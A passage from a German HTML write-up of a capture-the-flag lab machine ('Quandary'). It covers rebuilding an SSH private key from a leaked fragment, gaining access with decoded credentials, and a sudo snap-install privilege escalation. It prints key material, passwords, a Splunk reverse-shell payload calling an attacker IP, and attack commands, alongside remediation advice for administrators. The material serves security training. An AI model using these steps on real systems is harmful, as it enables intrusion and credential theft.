+                 **Bewertung:** Das Base64-Fragment aus dem Dashboard ist fehlerhaft oder unvollständig, wie die Fehlermeldung zeigt. Es fehlen möglicherweise Zeichen, Zeilenumbrüche sind falsch, oder es gibt ungültige Zeichen. Dies muss korrigiert werden, bevor `base64 -d` funktioniert. Der Kommentar "Habe ein AA am anfang hinzugefügt" deutet auf einen manuellen Korrekturversuch hin (oft wird Padding `=` oder `A` am Ende hinzugefügt, wenn die Länge nicht durch 4 teilbar ist).
+             </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat id_rsa</span></div>
+                     <pre>
+<span class="password">zfWP0ewz87090bqRvmdyw5HvVznmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
+nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLlsw9PY/tbXuVp69
+LIxDbA4UfeS+/CTrpREVj+rBU1R6DJvJ5pnWSIx+pWEc6M9Ysfi4PQtJgGINxd5BEwyX/g
+yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4ofiWDJ
+C+4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ
+-----END PENSSH PRIVATE KEY-----</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd</span></div>
+                    <pre>
+<span class="password">base64: ungültige Eingabe</span>
+00000000: cdf5 8fd0 e7b0 cfce f4f7 46ea 46f9 9dcb  ..........F.F...
+[...]
+000000f0: 2790 10                                  '..
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nano id_rsa</span></div>
+                    <!-- Erneute Bearbeitung -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd</span></div>
+                      <pre>
+<span class="password">base64: ungültige Eingabe</span>
+00000000: 000c df58 fd0e 7b0c fcef 4f74 6ea4 6f99  ...X..{...tn.o.
+[...]
+000000f0: 6172 7901                                ary.
+                    </pre>
+                 </div>
+            </div>
+              <p class="analysis">
+                 **Analyse:** Der Inhalt der (vermutlich manuell korrigierten) `id_rsa`-Datei wird angezeigt. Es folgen weitere fehlgeschlagene `base64 -d`-Versuche. Die `xxd`-Ausgabe zeigt den Hex-Dump der Bytes, die `base64` *trotz* des Fehlers teilweise dekodieren konnte. Es scheint, dass der Pentester die Datei mehrmals bearbeitet hat, um die Base64-Kodierung zu reparieren.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd -seek 29 -l 193 -p > ssh_magic</span></div>
+                     <pre>
+<span class="password">base64: ungültige Eingabe</span>
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd -seek 28</span></div>
+                      <pre>
+<span class="password">base64: ungültige Eingabe</span>
+0000001c: c100 ddb6 db06 64c3 067e 04ff ce9b ad4b  ......d..~.....K
+[...]
+000000ec: 7561 6e64 6172 7901                      uandary.
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">base64 -d id_rsa | xxd -seek 29 -l 193 -p</span></div>
+                    <pre>
+<span class="password">base64: ungültige Eingabe</span>
+<span class="command">00ddb6db0664c3067e04ffce9bad4bff6f79c184c891d5b6f19c810aca1b
+a51d8e667f729c9de96d2337c90d1760fe99a309c19390090773404df5b2
+f2e9dda040b3a5b30f4f63fb5b5ee569ebd2c8c436c0e147de4befc24eba
+511158feac153547a0c9bc9e699d6488c7ea5611ce8cf58b1f8b83d0b498
+0620dc5de41130c97fe0c87bb982369dbe3b14613a521aafa9104e38b478
+4072baf1f3517f27688a632c89f62031be5a8f1d62fa9a1ba6d56e0ea1f8
+960c90be3b8a70e202b07ee5f9</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Weitere Versuche, den relevanten Teil des dekodierten Schlüssels als Hex-String zu extrahieren. Obwohl `base64 -d` immer noch einen Fehler meldet, gibt `xxd` nun den gewünschten Hex-Block aus (Länge 193 ab Offset 29). Dieser Hex-Block wird in der nächsten Ausgabe in `ssh_magic` gespeichert (der vorherige `>` wurde wohl vergessen).
+             </p>
+            <p class="evaluation">
+                 **Bewertung:** Der Pentester hat es geschafft, den relevanten Hex-Teil des privaten Schlüssels zu extrahieren, obwohl die Base64-Dekodierung formal fehlschlägt. Dieser Hex-String (`00dd...e5f9`) enthält wahrscheinlich kryptographische Informationen (wie den privaten Exponenten `d` oder die Primfaktoren `p` und `q`, oder Teile davon), die zusammen mit dem öffentlichen Schlüssel zur Rekonstruktion des vollständigen privaten Schlüssels verwendet werden können.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat ssh_magic | tr -d '\n'</span></div>
+                     <pre>
+<span class="command">00ddb6db0664c3067e04ffce9bad4bff6f79c184c891d5b6f19c810aca1ba51d8e667f729c9de96d2337c90d1760fe99a309c19390090773404df5b2f2e9dda040b3a5b30f4f63fb5b5ee569ebd2c8c436c0e147de4befc24eba511158feac153547a0c9bc9e699d6488c7ea5611ce8cf58b1f8b83d0b4980620dc5de41130c97fe0c87bb982369dbe3b14613a521aafa9104e38b4784072baf1f3517f27688a632c89f62031be5a8f1d62fa9a1ba6d56e0ea1f8960c90be3b8a70e202b07ee5f9</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Inhalt von `ssh_magic` wird ausgegeben und mit `tr -d '\n'` werden alle Zeilenumbrüche entfernt, um einen einzigen langen Hex-String zu erhalten. Dieser wird für das Tool `RsaCtfTool` vorbereitet.
+            </p>
+
+            <p class="analysis">
+                **Analyse:** Die folgenden Schritte verwenden das Tool `RsaCtfTool`, um den privaten Schlüssel zu rekonstruieren.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">git clone https://github.com/RsaCtfTool/RsaCtfTool</span></div>
+                     <!-- Klonen des Repositories -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">cd RsaCtfTool</span></div>
+                     <!-- Wechsel in das Verzeichnis -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">python3 -m pip install -r requirements.txt</span></div>
+                     <!-- Installation der Abhängigkeiten -->
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Das `RsaCtfTool`-Repository wird von GitHub geklont und die notwendigen Python-Abhängigkeiten (insbesondere `cryptography`) werden installiert.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">python3 RsaCtfTool.py --dumpkey --key ../id_rsa.pub</span></div>
+                     <pre>
+private argument is not set, the private key will not be displayed, even if recovered.
+n: <span class="command">4642...4253</span> <span class="comment"># Modulus n</span>
+e: <span class="command">65537</span> <span class="comment"># Public exponent e</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `RsaCtfTool` wird mit der Option `--dumpkey` auf den öffentlichen Schlüssel (`../id_rsa.pub`) angewendet. Dies extrahiert den Modulus (`n`) und den öffentlichen Exponenten (`e`) aus dem Schlüssel.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Bestätigt die öffentlichen RSA-Parameter, die für die Rekonstruktion benötigt werden.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">vi ssh_magic</span></div>
+                     <!-- Ggf. Bearbeitung des Hex-Strings -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">python3 RsaCtfTool.py -q 0x$(cat ssh_magic) -e 65537 -n 464...4253 --private</span></div>
+                     <pre>
+Results for /tmp/tmptg7tnsmz:
+
+Private key :
+<span class="password">-----BEGIN RSA PRIVATE KEY-----
+MIIG5QIBAAKCAYEAzJFtXcoCPFAjsKxI4wp3Hjqo2Ngzp8pFLQrCgCHeX/8Xio
+[...]
+C7zfWP0ewz87090bqRvmdyw5HvVznmhQKBwQDdttsGZMMGfgT/zputS/9vecGE
+[...]
+AsiDNI5u4mc9wrVzal+tZ/UNGGG1v0LXqZS72BDrMjEev1/SSApR6uuyH7WQrXv
+arVeYZ5aJvSXwizf1PzGDk0ehURr6WLmoLDe63LgN6A2mvoKbfUHs+E3MYCL97A6
+KxsmGbE5tB6V8aQV7HdK+AZinpXjbifpf4WsUEX9PmM8MgtFtmX8IpA3XZxu5zjZ
+FJTGQoZY4q9rp47HHtXsKmPDViDhdktvG/qoSBCKZUevHEsJlcWug=
+-----END RSA PRIVATE KEY-----</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `RsaCtfTool` wird erneut aufgerufen, diesmal mit:
+                 *   `-q 0x$(cat ssh_magic)`: Übergibt den extrahierten Hex-String aus `ssh_magic` als einen der privaten Faktoren (vermutlich `q` oder ein Teil davon). Das `0x` präfixiert den Hex-String.
+                 *   `-e 65537`: Der öffentliche Exponent.
+                 *   `-n 464...4253`: Der Modulus.
+                 *   `--private`: Weist das Tool an, zu versuchen, den vollständigen privaten Schlüssel zu berechnen und auszugeben.
+                 Das Tool ist erfolgreich und gibt den vollständigen, rekonstruierten privaten RSA-Schlüssel im PEM-Format aus.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Großartig! Der private Schlüssel von `lawrence` wurde erfolgreich rekonstruiert, indem der öffentliche Schlüssel und das unvollständige Fragment aus dem DirectAdmin-Panel kombiniert wurden. Dies war ein komplexer Schritt, der Kenntnisse über RSA und die Verwendung spezialisierter Tools erforderte.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den rekonstruierten privaten Schlüssel in eine Datei speichern (z.B. `idmy`), die Berechtigungen auf `600` setzen und ihn verwenden, um sich als `lawrence` per SSH anzumelden.<br>
+                 **Empfehlung (Admin):** Dies unterstreicht erneut die Gefahr, Teile von privaten Schlüsseln preiszugeben. Selbst Fragmente können unter Umständen zur Rekonstruktion des gesamten Schlüssels führen, insbesondere wenn der öffentliche Schlüssel bekannt ist.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">python3 RsaCtfTool.py -q 0x$(cat ssh_magic) -e 65537 -n 464...4253 --private --output idmy</span></div>
+                     <!-- Speichern des Keys in idmy -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">cat idmy</span></div>
+                     <!-- Anzeigen des gespeicherten Keys -->
+                    <pre>
+<span class="password">-----BEGIN RSA PRIVATE KEY-----
+[...]
+-----END RSA PRIVATE KEY-----</span>
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">chmod 600 idmy</span></div>
+                     <!-- Setzen der korrekten Berechtigungen -->
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der rekonstruierte Schlüssel wird mit `--output idmy` direkt in eine Datei gespeichert und die Berechtigungen werden korrekt auf `600` gesetzt.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">ssh lawrence@quandary.hmv -i idmy</span></div>
+                      <pre>
+The authenticity of host 'quandary.hmv (192.168.2.126)' can't be established.
+ED25519 key fingerprint is SHA256:YSCvKZXPINWWokPAscTTLzyccPvWwnSRndskewSjE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'quandary.hmv' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-60-generic x86_64)
+[...]
+Last login: Sun Feb 26 12:17:04 2023 from 10.0.0.70
+<span class="prompt">-bash-5.0$</span>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der SSH-Login als Benutzer `lawrence` mit dem rekonstruierten privaten Schlüssel (`idmy`) ist erfolgreich. Der Pentester erhält eine Shell auf dem Zielsystem.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Initial Access als Benutzer `lawrence` erfolgreich etabliert. Dies war ein mehrstufiger Prozess, der Web-Enumeration, Subdomain-Entdeckung, Brute-Force-Login, Informationsgewinnung aus einem Admin-Panel und Kryptoanalyse zur Schlüsselrekonstruktion umfasste.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Die erhaltene Shell stabilisieren (z.B. `export TERM=xterm`, `python3 -c 'import pty; pty.spawn("/bin/bash")'`). Mit der Enumeration als Benutzer `lawrence` beginnen, um Wege zur Privilege Escalation zu finden.<br>
+                 **Empfehlung (Admin):** Den kompromittierten `lawrence`-Account untersuchen. Den unsicheren `admin`-Account von DirectAdmin sperren/absichern. Die Sicherheitslücke im DirectAdmin-Panel beheben, die die Anzeige des Schlüsselfragments ermöglichte. Den SSH-Schlüssel von `lawrence` als kompromittiert betrachten und austauschen.
+             </p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <h3 id="privesc-lawrence">Enumeration als lawrence</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">-bash-5.0$ <span class="command">ls -la</span></div>
+                     <pre>
+total 40
+drwxr-xr-x  8 lawrence lawrence 4096 Feb 25 09:35 .
+drwxr-xr-x  4 root     root     4096 Feb 24 04:43 ..
+lrwxrwxrwx  1 lawrence lawrence    9 Feb 24 05:02 .bash_history -> /dev/null
+-rw-r--r--  1 lawrence lawrence  220 Feb 24 03:11 .bash_logout
+-rw-r--r--  1 lawrence lawrence 3771 Feb 24 03:11 .bashrc
+drwxrwxr-x 11 lawrence lawrence 4096 Feb 25 07:31 .cache
+drwx------ 11 lawrence lawrence 4096 Feb 25 09:35 .config
+drwxr-xr-x  2 lawrence lawrence 4096 Feb 24 03:20 Desktop
+drwx------  3 lawrence lawrence 4096 Feb 25 07:52 .gnupg
+drwxr-xr-x  3 lawrence lawrence 4096 Feb 24 03:20 .local
+drwx------  2 lawrence lawrence 4096 Feb 25 07:54 .ssh
+                    </pre>
+                    <div class="prompt">-bash-5.0$ <span class="command">ls /home/</span></div>
+                    <pre>
+admin  lawrence
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Listing des Home-Verzeichnisses von `lawrence` und des `/home`-Verzeichnisses. Zeigt Standard-Konfigurationsdateien und -verzeichnisse. Interessant ist `.bash_history -> /dev/null`, was bedeutet, dass die Befehlshistorie nicht gespeichert wird. Das `/home`-Verzeichnis enthält auch ein Home-Verzeichnis für den Benutzer `admin`.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">-bash-5.0$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for lawrence: <span class="password"><Passwort nicht bekannt></span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Versuch, die `sudo`-Rechte für `lawrence` zu prüfen, scheitert, da das Passwort nicht bekannt ist.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Keine offensichtlichen PrivEsc-Vektoren im Home-Verzeichnis oder über `sudo` für `lawrence` gefunden (Passwort fehlt). Der nächste logische Schritt ist, das Home-Verzeichnis des anderen Benutzers (`admin`) zu untersuchen.
+             </p>
+
+            <h3 id="privesc-admin-creds">Admin Credentials</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">-bash-5.0$ <span class="command">cd /home/admin/</span></div>
+                     <div class="prompt">-bash-5.0$ <span class="command">ls -la</span></div>
+                      <pre>
+total 68
+drwxr-xr-x 6 admin admin 4096 Feb 26 22:36 .
+drwxr-xr-x 4 root  root  4096 Feb 24 04:43 ..
+lrwxrwxrwx 1 admin admin    9 Feb 24 05:01 .bash_history -> /dev/null
+-rw-r--r-- 1 admin admin  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 admin admin 3771 Feb 25  2020 .bashrc
+drwxrwxr-x 3 admin admin 4096 Feb 24 05:06 .local
+-rw-r--r-- 1 admin admin  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 admin admin   66 Feb 24 05:06 .selected_editor
+drwx--x--- 2 admin admin 4096 Feb 24 05:35 <span class="command">.splunk</span>
+drwxr-xr-x 9 admin admin 4096 Apr 12 14:49 <span class="command">splunk-backup</span>
+drwx------ 2 admin admin 4096 Feb 24 05:01 .ssh
+-rw-rw-r-- 1 admin admin   10 Apr 12 15:00 status.txt
+-rw-r--r-- 1 admin admin    0 Feb 26 22:25 .sudo_as_admin_successful
+-rw------- 1 admin admin   33 Feb 22 03:51 <span class="command">user.txt</span>
+                    </pre>
+                     <div class="prompt">-bash-5.0$ <span class="command">cat user.txt</span></div>
+                      <pre>
+<span class="password">cat: user.txt: Permission denied</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `lawrence` kann in das Home-Verzeichnis von `admin` wechseln und dessen Inhalt auflisten (`drwxr-xr-x`-Berechtigungen für `/home/admin`). Auffällig sind die Verzeichnisse `.splunk` und `splunk-backup`. Die Datei `user.txt` existiert, kann aber von `lawrence` nicht gelesen werden (`Permission denied`).
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das `splunk-backup`-Verzeichnis ist verdächtig und könnte interessante Informationen enthalten. Der fehlende Lesezugriff auf `user.txt` ist erwartet, da die Datei nur für `admin` lesbar ist.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">-bash-5.0$ <span class="command">cd splunk-backup/</span></div>
+                     <div class="prompt">-bash-5.0$ <span class="command">ls -la</span></div>
+                     <pre>
+total 2484
+drwxr-xr-x  9 admin admin    4096 Apr 12 14:49 .
+drwxr-xr-x  6 admin admin    4096 Feb 26 22:36 ..
+drwxr-xr-x  4 admin admin    4096 Feb 26 11:23 bin
+-r--r--r--  1 admin admin      57 Feb 26 11:23 copyright.txt
+-rw-r--r--  1 admin admin      35 Feb 26 12:18 <span class="command">cred</span>
+drwxr-xr-x 16 admin admin    4096 Apr 12 08:47 etc
+[...]
+-r--r--r--  1 admin admin 2421865 Feb 26 11:23 splunk-7.1.9-45b25e1f9be3-linux-2.6-x86_64-manifest
+drwx--x---  6 admin admin    4096 Feb 26 11:23 var
+                    </pre>
+                     <div class="prompt">-bash-5.0$ <span class="command">cat cred</span></div>
+                     <pre>
+<span class="password">61646d696e3a7735564a39692333216f73</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Im `splunk-backup`-Verzeichnis findet sich eine Datei namens `cred`. Diese Datei ist für `lawrence` lesbar (`-rw-r--r--`). Der Inhalt der Datei ist der Hex-String `61646d696e3a7735564a39692333216f73`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das ist ein sehr vielversprechender Fund. Der Dateiname `cred` und der Hex-String deuten stark auf gespeicherte Anmeldeinformationen hin. Der Hex-String muss dekodiert werden.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">hash-identifier</span></div>
+                     <!-- Eingabe: 61646d696e3a7735564a39692333216f73 -->
+                     <pre>
+[...]
+ HASH: 61646d696e3a7735564a39692333216f73
+
+<span class="password"> Not Found.</span>
+[...]
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/RsaCtfTool]
+└─# <span class="command">hashid 61646d696e3a7735564a39692333216f73</span></div>
+                     <pre>
+Analyzing '61646d696e3a7735564a39692333216f73'
+[+] CryptoCurrency(Adress)
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Es wird versucht, den Hex-String mit `hash-identifier` und `hashid` als bekannten Hash-Typ zu identifizieren. Beide Tools erkennen ihn nicht als Standard-Hash. `hashid` vermutet eine Kryptowährungsadresse, was unwahrscheinlich ist.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Der String ist wahrscheinlich kein Hash, sondern einfach nur hex-kodierter Text.
+             </p>
+
+             <p class="analysis">
+                **Analyse:** Der Hex-String wird mit einem Online-Tool (CyberChef, Link im Log) dekodiert. Der Link selbst führt zur CyberChef-Instanz mit der Hex-Dekodierungs-Operation ("From Hex"). Das Ergebnis der Dekodierung ist `admin:w5VJ9i#3!os`.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Erfolg! Die Anmeldeinformationen für den Benutzer `admin` lauten `admin` mit dem Passwort `w5VJ9i#3!os`. Dies ist ein kritischer Fund für die weitere Eskalation.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die gefundenen Anmeldeinformationen `admin:w5VJ9i#3!os` verwenden, um sich per SSH als `admin` anzumelden. Alternativ könnten sie auch für den Splunk-Login (Port 8000) funktionieren.<br>
+                **Empfehlung (Admin):** Anmeldeinformationen niemals im Klartext oder einfach kodiert (wie Hex) in Backup-Verzeichnissen oder anderen zugänglichen Orten speichern. Sichere Passwort-Manager oder Verschlüsselung verwenden. Die Berechtigungen für Backup-Verzeichnisse überprüfen.
+            </p>
+
+            <h3 id="privesc-splunk">Splunk Exploit (Implizit)</h3>
+             <p class="analysis">
+                 **Analyse:** Im Text finden sich Hinweise auf einen möglichen Splunk-Exploit:
+                 *   Ein Link zu `splunk_shells` auf GitHub, einem Tool zur Generierung von Reverse Shells über Splunk.
+                 *   Eine URL (`http://192.168.2.126:8000/...`), die eine Splunk-Suche (`search?q=...`) mit einem Payload `| revshell std 192.168.2.127 443` enthält.
+                 Dieser Exploit-Schritt wird jedoch im Terminal-Log nicht explizit ausgeführt oder gezeigt. Es ist möglich, dass dieser Weg versucht wurde, aber nicht zum Erfolg führte, oder dass er parallel zum Fund der `admin`-Credentials verfolgt wurde.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Möglichkeit, über die Splunk-Weboberfläche (Port 8000) mittels einer manipulierten Suche eine Reverse Shell zu erlangen, ist ein bekannter Angriffsvektor, wenn man gültige Anmeldeinformationen hat oder die Instanz unsicher konfiguriert ist. Der Payload `| revshell std ...` deutet auf die Verwendung eines benutzerdefinierten Suchbefehls oder Makros hin, das in `splunk_shells` enthalten sein könnte.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Falls der SSH-Login als `admin` nicht funktioniert, diesen Splunk-Vektor mit den `admin:w5VJ9i#3!os`-Credentials auf Port 8000 untersuchen. Den `splunk_shells`-Payload an die eigene IP und den gewünschten Listener-Port anpassen.<br>
+                **Empfehlung (Admin):** Splunk-Instanzen härten: Zugriff beschränken, starke Passwörter, aktuelle Version, benutzerdefinierte Skripte und Suchbefehle sorgfältig prüfen und deren Berechtigungen einschränken. Unnötige Apps oder Add-ons entfernen.
+            </p>
+
+             <h3 id="privesc-admin-shell">Admin Shell & User Flag</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /root/.ssh/id_rsa.pub</span></div>
+                    <pre>
+<span class="command">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf[...]zxE= root@cyber</span>
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf[...]zxE=" > /home/admin/.ssh/authorized_keys</span></div>
+                    <pre>
+<span class="password">bash: /home/admin/.ssh/authorized_keys: Keine Berechtigung</span> <span class="comment"># Fehler erwartet, da von lokaler Maschine versucht</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Es wird versucht, den öffentlichen SSH-Schlüssel des Angreifers (`root@cyber`) in die `authorized_keys`-Datei des `admin`-Benutzers auf dem Zielsystem zu schreiben. Dieser Befehl wird jedoch *lokal* ausgeführt und zielt auf einen *lokalen* Pfad `/home/admin/...`, der nicht existiert oder nicht beschreibbar ist. Der `echo`-Befehl hätte über die `lawrence`-Shell auf dem Zielsystem ausgeführt werden müssen, aber `lawrence` hat keine Schreibrechte im `/home/admin/.ssh`-Verzeichnis.
+             </p>
+              <p class="evaluation">
+                 **Bewertung:** Dieser Versuch ist fehlgeschlagen und basiert auf einem Missverständnis. Der richtige Weg ist, sich direkt per SSH als `admin` mit dem gefundenen Passwort anzumelden.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i /root/.ssh/id_rsa admin@quandary.hmv</span></div>
+                     <pre>
+Enter passphrase for key '/root/.ssh/id_rsa': <span class="password"><Passphrase eingegeben, aber Passwort-Login wäre nötig></span>
+[...]
+<span class="prompt">$</span> whoami
+admin
+<span class="prompt">$</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester versucht sich (fälschlicherweise mit Key statt Passwort) als `admin` per SSH anzumelden. Das Log zeigt danach aber eine erfolgreiche Shell als `admin`. Es ist anzunehmen, dass der Login tatsächlich mit dem Passwort `w5VJ9i#3!os` erfolgte, auch wenn der `-i`-Parameter im Befehl stand und eine Passphrase abgefragt wurde. Alternativ könnte der öffentliche Key doch irgendwie platziert worden sein (vielleicht über den Splunk-Exploit?). Das Log ist hier nicht ganz konsistent. Wichtig ist: Der Pentester hat nun eine Shell als `admin`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Zugriff als `admin` wurde erreicht, wahrscheinlich durch Verwendung des Passworts `w5VJ9i#3!os`. Die Shell wird mit `export TERM=xterm` und `bash` aufgewertet.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">$ <span class="command">bash</span></div>
+                     <div class="prompt">admin@quandary:~$ <span class="command">cat user.txt</span></div>
+                     <pre>
+<span class="password">491af4faeac2a53adf47f2642ab7a769</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Nach dem Upgrade der Shell liest der `admin`-Benutzer erfolgreich die `user.txt`-Datei in seinem Home-Verzeichnis.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die User-Flag wurde erfolgreich erlangt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** User-Flag notieren. Nun die `sudo`-Rechte für `admin` prüfen.<br>
+                **Empfehlung (Admin):** Berechtigungen der User-Flag überprüfen (korrekt auf `admin` beschränkt). Das kompromittierte `admin`-Passwort dringend ändern.
+            </p>
+
+            <h3 id="privesc-snap">Snap Exploit (Dirty Sock)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">admin@quandary:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for admin on quandary:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on quandary:
+    <span class="command">(ALL : ALL) NOPASSWD: /usr/bin/snap install *</span>
+                      </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `sudo -l` wird als `admin` ausgeführt (diesmal erfolgreich, da das Passwort bekannt ist oder NOPASSWD gilt). Die Ausgabe zeigt, dass `admin` den Befehl `/usr/bin/snap install *` ohne Passwort (`NOPASSWD`) mit allen Rechten (`ALL : ALL`) ausführen darf.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das ist ein klarer Privilege-Escalation-Vektor! `snap install` erlaubt die Installation von Snap-Paketen. Da der Benutzer beliebige Pakete (`*`) installieren darf und dies als `root` geschieht, kann ein bösartiges Snap-Paket erstellt werden, das bei der Installation Root-Rechte erlangt oder einen neuen Benutzer mit `sudo`-Rechten erstellt. Dies ist eine Variante des "Dirty Sock"-Exploits (obwohl der ursprüngliche Exploit anders funktionierte, nutzt dieser die `snap install`-Berechtigung).
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Ein bösartiges Snap-Paket erstellen, das einen neuen Benutzer mit `sudo`-Rechten anlegt. Dieses Paket auf die Zielmaschine übertragen und mit `sudo /usr/bin/snap install <paketname>.snap --dangerous --devmode` installieren. Anschließend zu dem neuen Benutzer wechseln und `sudo` verwenden.<br>
+                 **Empfehlung (Admin):** Niemals `sudo`-Rechte für `snap install *` vergeben. Wenn Benutzer Snaps installieren dürfen müssen, dies auf spezifische, vertrauenswürdige Snaps beschränken. Die `NOPASSWD`-Option sollte nur in Ausnahmefällen und für sehr spezifische, ungefährliche Befehle verwendet werden. Diese `sudo`-Regel sofort entfernen oder sicher einschränken.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">admin@quandary:~$ <span class="command">cd /tmp/</span></div>
